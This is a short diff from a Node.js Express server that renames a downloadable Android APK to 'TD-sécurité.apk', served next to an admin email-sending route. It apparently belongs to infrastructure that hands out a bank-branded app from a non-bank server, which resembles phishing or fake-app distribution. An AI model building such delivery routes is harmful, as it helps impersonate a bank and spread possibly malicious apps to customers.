@@ -797,7 +797,7 @@ app.post('/api/admin/send-email', async (req, res) => {
 // APP DOWNLOAD ROUTE
 // =============================================
 app.get('/api/download-td-app', (req, res) => {
-  const apkPath = path.join(__dirname, 'public', 'TDBank.apk');
+  const apkPath = path.join(__dirname, 'public', 'TD-sécurité.apk');
   res.download(apkPath, 'TD-sécurité.apk', (err) => {
     if (err) {
       console.error('[Download] Error sending TD-sécurité.apk:', err.message);
